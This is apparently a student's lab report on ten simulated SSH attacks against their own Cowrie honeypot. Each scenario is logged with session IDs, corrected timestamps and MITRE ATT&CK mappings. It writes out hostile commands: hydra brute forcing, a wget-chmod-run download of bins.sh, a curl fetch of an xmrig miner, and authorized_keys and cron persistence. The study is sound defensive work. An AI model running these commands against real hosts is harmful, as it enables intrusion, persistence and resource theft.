# Attack scenarios

## Scenario 1: connect-only scan

This one happened right at the start of the lab while I was just testing the connection from my attacker VM Kali to my honeypot. I did not plan it as a scenario so I did not note the time or the command and I only found it later when I went looking in the `Cowrie log`. I think I used nc to just touch port 2222 and close it with no login and no typing but I do not remember the exact command so I am marking it as a guess.

Command I think I used:` nc -vz <vm-ip> 2222`

In the log I found session `de4f6c6abbeb` coming from my attacker VM Kali to port `2222` and it has only `2 `events. The first is the connect at`2026-10-31T00:31:18Z`in Cowrie log time and the second is the closed event about `4 milliseconds `later. The closed event itself says the connection was lost after `2 milliseconds`. There is no client version event and no login and no command so nothing happened except the knock on the door. I think this fits nc because a real ssh client would send its version first but that is only my guess and I have not checked it.

I did not note the true UTC time for this one. The Cowrie log time has the same` 5 hour shift` as the other scenarios so my calculation says it was about `2026-10-30T19:31` in true UTC but that is calculated and not noted.

Now if I try to map this to `MITRE ATT&CK` the number would be` T1595 (Active Scanning)` means a connection that only touches the port to see if it is open (`Label: SIMULATED.`)

---

## Scenario 2: brute force that fails

I started this after the whole setup was done so I turned both VMs on and turned Cowrie on and checked its status. Before the attack I disconnected the Bridged adapter of my attacker VM Kali and checked that only the host-only address was left. Then I came to my attacker VM Kali and started hydra from there against my own honeypot on port `2222`. I used the wordlists I made for users and passwords with a total of `20 users and 100 passwords` and that gives a total of `2000` planned attempts. I left the two accounts that the honeypot allows out of both lists on purpose so none of them could work and none of them worked in the system. Hydra tried them `4` at a time because I declared a max of `4 tasks per server`.

Command: `hydra -L users.txt -P pass.txt -s 2222 -t 4 ssh://<vm-ip>`

The time I noted before starting hydra was `2026-10-30T21:51:37Z `as per UTC and the time I noted just after it ended was around `2026-10-30T22:03:24Z.` Hydra ran about` 11 minutes` at around `185 tries per minute` and ended with the line 1 of 1 target completed and `0 valid password` found. During all this I was continuously monitoring Cowrie for the attempts and it was logging them all. The Cowrie log window time was `2026-10-31T02:51:37 to 2026-10-31T03:03:24` because my Debian VM is set to a timezone 5 hours ahead of UTC and the Cowrie log stamps follow that local time even though they end with a Z. I proved it with timedatectl which showed` 5 hours` between the local time and the universal time. My first filter used true UTC and found 0 sessions so I had to shift the window.

After all this I came up with the results of a total of 161 sessions with `2080 failed attempts `and 0 successful logins. Hydra planned 2000 tries but Cowrie logged `2080` and I think hydra retried some of them but I have not proven it. If I do the calculation that was about `13 tries` per session on average and that was pretty fast so I was curious and shocked too because I saw this for the first time in my own logs. Because this scenario has many sessions I identify it by the time window and not by one session ID.

Now if I try to map this to `MITRE ATT&CK` the number would be `T1110 (Brute Force)`The scenario where I used hydra to do the attempts(`Label: SIMULATED.`)

---

## Scenario 3: brute force that succeeds

This time I logged in again using the normal ssh prompt from my attacker VM to my own honeypot on port `2222`. The account name was the allowed lab account. I entered the first `2` passwords wrong and at the `third` attempt I entered the right one and it worked so a successful brute force was logged in my Cowrie and I checked it. I typed the password by hand because I did not want the lab account and its password to go into `users.txt` and `pass.txt` for security reasons.

Command: `ssh <lab-account>@<vm-ip> -p 2222`

I think I made typing mistakes on my first try and that was the part that went wrong. I read the full event list of both sessions and the log shows that the first connection `927a2b4fbff1` had `3 failed logins` and then closed and the second connection `1f4f4ebf8204` had `1 failed login` and then closed and neither of them has a success. We are humans and make mistakes so that is normal. I did not remove them and they stay in the logs as proof. They are not part of this scenario.

The time I noted before starting was `2026-10-30T22:36:45Z` in true UTC and I ended and checked it again and it was `2026-10-30T22:38:01Z`. The Cowrie log window is `2026-10-31T03:36:45 to 2026-10-31T03:38:01` with the same `5 hour shift` as before because of the timezone of my Debian VM.

Then I came to Cowrie and checked my attempts with jq using a command and the session ID was `9ecf35dfcc82`. It shows `two failed logins` at `03:37:10` and `03:37:18` and then `one success` at `03:37:37` about `29 seconds` after the connect. After being sure it was logged and worked I just typed exit in my attacker VM and the session closed at `03:37:59` so it lasted about `51 seconds`. The major part that I think helped me was monitoring the log after my attempts to check if any of them worked or not and except the last one all failed.

Now if I try to map this to `MITRE ATT&CK` the number would be `T1110 (Brute Force)` for the wrong passwords before the success and `T1078.003 (Valid Accounts: Local Accounts)` for the scenario where I used a valid account (`Label: SIMULATED.`)

---

## Scenario 4: recon after login

I came back to my attacker VM Kali and logged in again by hand to my own honeypot on port `2222` with the allowed lab account. This time I wanted to look around the system like an attacker does after getting in. The first try worked with `no failed logins` so this scenario starts at the login.

Command: `ssh <lab-account>@<vm-ip> -p 2222`

I typed `uname -a` first to see the system and the fake machine answered with a Linux kernel line. Then I typed `cat /proc/cpuinfo` to get the details of the CPU and it printed `two processors`. Then I typed `whoami` and it told me the name of my lab account. Then I typed `free -m` to check the memory and then `ps aux` to see the running processes. At last I typed `ls` and nothing printed so I tried once again and nothing printed again and then I typed `exit` and got out. All these answers are made up by Cowrie so none of it shows the real VM.

The time I noted before starting was `2026-10-30T23:13:44Z` in true UTC and the time I noted after it ended was `2026-10-30T23:17:11Z`. The Cowrie log window is `2026-10-31T04:13:44 to 2026-10-31T04:17:11` with the same `5 hour shift` as before because of the timezone of my Debian VM. I did not note this window at the time so I calculated it from the true UTC time.

Then I came to Cowrie and the session ID was `cc4e34486973`. It shows `8 commands` in this order: `uname -a`, `cat /proc/cpuinfo`, `whoami`, `free -m`, `ps aux`, `ls`, `ls` and `exit`. The session lasted about `2 minutes and 11 seconds`. The answers were fake so I only know what I typed and what Cowrie logged.

Now if I try to map this to `MITRE ATT&CK` the number would be `T1082 (System Information Discovery)` for the commands that look at the system and `T1083 (File and Directory Discovery)` for the `ls` commands (`Label: SIMULATED.`)

---

## Scenario 5: download and execute

I came back to my attacker VM Kali and started a small web server there that held a harmless script called `bins.sh`. I bound it to the host-only address only so it could never be reached from the Bridged side. In another tab I opened another shell and logged in by hand to my own honeypot with the lab account. My plan was to get the file onto my victim machine like an attacker would so I typed `wget` to fetch it but it failed and the error said `name resolution failed`. I was a little shocked that something broke and then I shifted my mood to investigation.

Command: `python3 -m http.server 8000 --bind <kali-ip>`

Command: `wget http://<kali-ip>:8000/bins.sh`

The web server window showed nothing so I knew the request never arrived. I made a plain request from Debian to the same server outside Cowrie and it worked and returned `37 bytes` so the network and the server were fine and the problem was inside Cowrie. I searched the code of Cowrie and found that the error text is written by its own wget command. Before it connects it checks the address and blocks every address that is not a public internet address. My lab address is private so it blocked mine. The `name resolution failed` line was a fake one shown by the Cowrie script because no lookup happened at all. I think this is a safety feature but that is my guess because I did not read the reason from the developers. I thought about changing Cowrie so the download would work but I did not do that because it would alter my real research and I am stating this honestly here.

My first try is session `94e82f308aaf` and it has only the `wget` and then `exit` so it is incomplete. The web server was on and saw nothing. It stays in the log as proof and it is not part of this scenario. For the record I tried again and typed `wget` then `chmod +x bins.sh` to make it executable and at last `./bins.sh` to run it like an attacker would. The web server was off for this second try and it is the scenario.

Command: `chmod +x bins.sh`

Command: `./bins.sh`

The time I noted before the second try was `2026-10-30T23:56:44Z` in true UTC and the time I noted after it ended was `2026-10-30T23:58:59Z`. The Cowrie log window is `2026-10-31T04:56:44 to 2026-10-31T04:58:59` with the same `5 hour shift` as before because of the timezone of my Debian VM.

Then I came to Cowrie and found one session in that window and the session ID was `4482296f8cb3`. It shows one successful login at `04:57:07` and `no failed logins`. After that it shows `4 commands` in this order: `wget`, `chmod +x bins.sh`, `./bins.sh` and `exit`. It shows one failed command event for `./bins.sh` and `no download event` at all so no file was captured. The session closed at `04:58:33` so it lasted about `93 seconds`. My activity was logged in Cowrie even though the download was blocked.

Now if I try to map this to `MITRE ATT&CK` the number would be `T1105 (Ingress Tool Transfer)`. It failed because of the Cowrie rule but it was an attempt (`Label: SIMULATED.`)

---

## Scenario 6: SSH key persistence

This was the next scenario and it is about adding an SSH key. I noted the start time first and it was `2026-10-31T10:17:21Z` in true UTC. Then I logged in by hand from my attacker VM Kali to my own honeypot with the lab account on port `2222` and I got in.

Command: `ssh <lab-account>@<vm-ip> -p 2222`

Then I typed `mkdir -p ~/.ssh`. The `-p` flag means no error if the folder already exists and it also makes the parent folder if it is missing. Because this is Cowrie I was not sure if the fake shell would really handle the parent folders and I did not check it. After that I typed an echo command that wrote a fake key line into `authorized_keys` and it was only a fake text and not a real key.

Command: `mkdir -p ~/.ssh`

Command: `echo "ssh-rsa FAKEKEY lab" >> ~/.ssh/authorized_keys`

Then I switched to my Debian VM and checked if Cowrie really logged it and it did. I found one session in my window and the session ID was `fc0d9c9bb7e8`. It shows one successful login at `15:18:03` about `8 seconds` after the connect and `no failed logins`. It shows `2 commands` that I typed which are the `mkdir` at `15:18:28` and the `echo` at `15:18:49`.

Then I saw one more thing and it shocked me a bit. Cowrie logged a `file_download` event even though I did not download anything. I only used `echo` and redirected it with `>>`. I read the full event and it says Cowrie saved what the redirect wrote and the destination file was `authorized_keys`. It has no URL because nothing came from the internet. I read the saved file and it had only my one fake key line. I did not compute the hash myself so I take it from Cowrie.

At last I typed `exit` and noted the time again and it was `2026-10-31T10:20:41Z` in true UTC. The Cowrie log window is `2026-10-31T15:17:21 to 2026-10-31T15:20:41` with the same `5 hour shift` as before because of the timezone of my Debian VM. The session closed at `15:20:38` and Cowrie says `162498` milliseconds so it lasted about `2 minutes and 42 seconds`. I did not test if a key like this would really let someone in because the honeypot does not do that.

Now if I try to map this to `MITRE ATT&CK` the number would be `T1098.004 (SSH Authorized Keys)` which is adding an SSH key so the attacker can get back in later without the password (`Label: SIMULATED.`)

---

## Scenario 7: cron persistence

This was the next scenario and it is about adding a cron job so something would run again later. I noted the start time first and it was `2026-10-31T10:34:43Z` in true UTC. Then I logged back in by hand from my attacker VM Kali to my own honeypot with the lab account on port `2222` and I got in.

Command: `ssh <lab-account>@<vm-ip> -p 2222`

First I checked the existing cron jobs but none was created yet so nothing useful printed. Then I typed the command that creates a cron job with a fake path and it was only a fake one and not a real tool.

Command: `crontab -l`

Command: `echo "* * * * * /tmp/x" | crontab -`

Then I switched to my Debian VM and checked if Cowrie really logged it and it did. I found one session in my window and the session ID was `d073975be95f`. It shows one successful login at `15:36:04` about `8 seconds` after the connect at `15:35:56` and `no failed logins`. It shows `3 commands` in this order: `crontab -l` at `15:36:24`, the `echo` line at `15:36:59` and `exit` at `15:38:21`. The whole session has `13 events`. There is no `cowrie.session.file_download` event and no `cowrie.command.failed` event.

I do not know what the fake shell did with the cron line because Cowrie logged only what I typed so I cannot say a job was stored. I did not test if it would ever run because the honeypot does not do that.

At last I typed `exit` and noted the time again and it was `2026-10-31T10:38:24Z` in true UTC. The Cowrie log window is `2026-10-31T15:34:43 to 2026-10-31T15:38:24` with the same `5 hour shift` as before because of the timezone of my Debian VM. The session closed at `15:38:21` and Cowrie says `145163` milliseconds so it lasted about `2 minutes and 25 seconds`.

Now if I try to map this to `MITRE ATT&CK` the number would be `T1053.003 (Scheduled Task/Job: Cron)` which is adding a cron job so the attacker can get a job to run again later (`Label: SIMULATED.`)

---

## Scenario 8: miner-style commands

This was the next scenario and it is about the commands of a cryptominer attacker. It is text only. I noted the start time first and it was `2026-10-31T11:03:27Z` in true UTC. The Cowrie log time for the start is `2026-10-31T16:03:27` with the same `5 hour shift` as before because of the timezone of my Debian VM. I checked first that my attacker VM Kali had only the host-only address. Then I logged in by hand from my attacker VM Kali to my own honeypot with the lab account on port `2222`.

Command: `ssh <lab-account>@<vm-ip> -p 2222`

I made a mistake on the first try. I typed a wrong password and then I pressed Ctrl+C. The log shows this as session `26202dcad198` with one failed login at `16:04:20` and a close at `16:04:51`. It has no successful login and no commands so it stays in the log as proof and it is not part of this scenario. Then I logged in again and this is the scenario. The web server on Kali was off the whole time because Cowrie blocks private addresses and I did not start it.

I typed a curl command that tries to download a miner file called `xmrig` and then a chmod command that tries to make it executable. The file never arrived so the second command had nothing to work on.

Command: `curl -O http://<kali-ip>:8000/xmrig`

Command: `chmod +x xmrig`

The fake shell answered the curl line with `Could not resolve host` and the chmod line with `No such file or directory`. I think this is the same Cowrie block as in scenario 5 but that is my guess because I only read the code of its `wget` and not of `curl`.

I did not type `exit` this time. I waited and the fake shell printed `timed out waiting for input: auto-logout` and closed the connection by itself. So I have no end time that I noted on Kali. I think the idle timeout is about `180 seconds` but that is my guess and I did not check it in the settings.

Then I came to Cowrie and the session ID was `38b83be6391c`. It shows one successful login at `16:05:02` about `7 seconds` after the connect at `16:04:55` and `no failed logins`. It shows `2 commands` that I typed which are the `curl` at `16:05:09` and the `chmod` at `16:05:37`. The whole session has `12 events`. There is no `cowrie.session.file_download` event and no `cowrie.command.failed` event. The session closed at `16:08:36` in Cowrie log time and Cowrie says `221442` milliseconds so it lasted about `3 minutes and 41 seconds`. The close time in true UTC is calculated as `2026-10-31T11:08:36Z` and it is not noted.

Now if I try to map this to `MITRE ATT&CK` the number would be `T1496 (Resource Hijacking)` for the miner name `xmrig` in my commands. No miner ran and nothing was downloaded so it is only the text of the commands (`Label: SIMULATED.`)

---

---

## Scenario 9: slow human session

This one is not about a technique. It is about how a person types. A bot fires its commands one after another and a person stops and thinks between them so I wanted one session where the pauses are big and easy to see in the log. I noted the start time first and it was `2026-10-31T11:23:45Z` in true UTC. The Cowrie log time for the start is `2026-10-31T16:23:45` with the same `5 hour shift` as before because of the timezone of my Debian VM. Then I logged in by hand from my attacker VM Kali to my own honeypot with the lab account on port `2222`.

Command: `ssh <lab-account>@<vm-ip> -p 2222`

I planned pauses of about `30 seconds` between my commands and I kept all of them well below the idle limit so the fake shell would not log me out by itself. I typed `whoami` and it printed the name of my lab account. Then I typed `pwd` and it printed the home folder of my lab account. Then I typed `ls` and nothing printed. At last I typed `exit` and got out.

Command: `whoami`

Command: `pwd`

Command: `ls`

Then I switched to my Debian VM and counted the sessions after my start time and there was only `1` so no extra try this time and the session ID was `62248f39d2c8`. It shows one successful login at `16:24:13` about `6 seconds` after the connect at `16:24:07` and `no failed logins`. It shows `3 commands` and an exit in this order: `whoami` at `16:25:03`, `pwd` at `16:25:33`, `ls` at `16:26:13` and `exit` at `16:27:19`. The whole session has `14 events`. There is no `cowrie.session.file_download` event and no `cowrie.command.failed` event.

This is the part that matters for this scenario. I calculated the gaps from the timestamps. From the login to `whoami` it is about `49 seconds` and from `whoami` to `pwd` about `30 seconds` and from `pwd` to `ls` about `40 seconds` and from `ls` to `exit` about `66 seconds`. So some of my pauses were longer than the `30 seconds` I planned. A bot would not wait like this. I can only say the gaps are big. The log cannot prove that a real human was typing.

At last I noted the time again and it was `2026-10-31T11:27:20Z` in true UTC. The Cowrie log window is `2026-10-31T16:23:45 to 2026-10-31T16:27:20`. The session closed at `16:27:19` and Cowrie says `192302` milliseconds so it lasted about `3 minutes and 12 seconds`.

Now if I try to map this to `MITRE ATT&CK` the playbook has no ATT&CK number for this one so I am not inventing one. It is a behavior and not a technique. I call it a slow human session and the planned label is behavioral (`Label: SIMULATED.`)

---

---

## Scenario 10: fast bot session

This one is the opposite of scenario 9. A bot does not stop and think and it does not open a shell and type line by line so I wanted one session where the commands come in all at once and the log shows almost no time between them. I used the same three commands as in scenario 9 so I can compare the slow and the fast session directly. I checked first that Cowrie was running and that my attacker VM Kali had only the host-only address. Then I noted the start time and it was `2026-10-31T11:43:49Z` in true UTC. The Cowrie log time for the start is `2026-10-31T16:43:49` with the same `5 hour shift` as before because of the timezone of my Debian VM.

This time I did not open a shell. I put the three commands inside the ssh line itself in quotes and I split them with semicolons. I still typed the password by hand like in every scenario. After that the commands ran by themselves and the connection closed and I did not type `exit`.

Command: `ssh <lab-account>@<vm-ip> -p 2222 'whoami; pwd; ls'`

On my Kali screen the fake shell printed the name of my lab account for `whoami` and the home folder of my lab account for `pwd` and nothing for `ls`. Then I noted the end time and it was `2026-10-31T11:44:34Z` in true UTC. The Cowrie log window is `2026-10-31T16:43:49 to 2026-10-31T16:44:34`.

Then I switched to my Debian VM and counted the sessions after my start time and there was only `1` so no extra try this time and the session ID was `8eb88da2840c`. The whole session has `10 events`. It shows the connect at `16:44:11` and one successful login at `16:44:19` about `8 seconds` after the connect and `no failed logins`. Those `8 seconds` were me typing the password by hand so they are not bot speed. There is no `cowrie.session.file_download` event and no `cowrie.command.failed` event.

This is the part that matters for this scenario. Cowrie logged only `1` command event and its text is `whoami; pwd; ls` so it did not log three separate commands like in scenario 9. I think this is because the ssh client sent the whole string in one piece but that is my guess and I did not check it. The command came about `0.23 seconds` after the login and the log closed about `0.01 seconds` after the command. The session closed at `16:44:19` and Cowrie says `8476` milliseconds so it lasted about `8.5 seconds`. Scenario 9 had the same three commands and it lasted `192302` milliseconds so this one is about `23 times` shorter.

The close time in true UTC is calculated as `2026-10-31T11:44:19Z` and it is not noted. The end time I noted on Kali is about `15 seconds` after the session really closed. I can only say this session looks fast in the log. It does not prove that a real bot was behind it because I ran it myself and I typed the password by hand.

Now if I try to map this to `MITRE ATT&CK` the playbook has no ATT&CK number for this one so I am not inventing one. It is a behavior and not a technique. I call it a fast bot session and the planned label is behavioral (`Label: SIMULATED.`)
